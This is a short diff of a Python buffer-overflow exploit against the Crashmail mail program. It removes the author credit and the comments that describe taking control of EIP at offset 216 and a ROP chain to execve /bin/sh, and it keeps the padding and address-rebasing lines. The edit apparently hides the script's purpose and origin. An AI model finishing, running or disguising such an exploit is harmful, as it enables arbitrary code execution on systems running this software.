@@ -1,6 +1,3 @@
-# Exploit author: Juan Sacco <jsacco@exploitpack.com>
-# Website: http://exploitpack.com
-#
 # Description: Crashmail is prone to a stack-based buffer overflow because the application fails to perform adequate boundary checks on user supplied input.
 # Impact: An attacker could exploit this vulnerability to execute arbitrary code in the context of the application. Failed exploit attempts may result in a denial-of-service condition.
 # Vendor homepage: http://ftnapps.sourceforge.net/crashmail.html
@@ -13,10 +10,7 @@ p = lambda x : pack('I', x)
 IMAGE_BASE_0 = 0x08048000 # ./crashmail
 rebase_0 = lambda x : p(x + IMAGE_BASE_0)
 
-# Control of EIP at 216
-# ROP chain: execve ( binsh )
-# Static-linked
-junk = 'A'*216 # Fill
+junk = 'A'*216 # Padding bytes
 
 from struct import pack
 
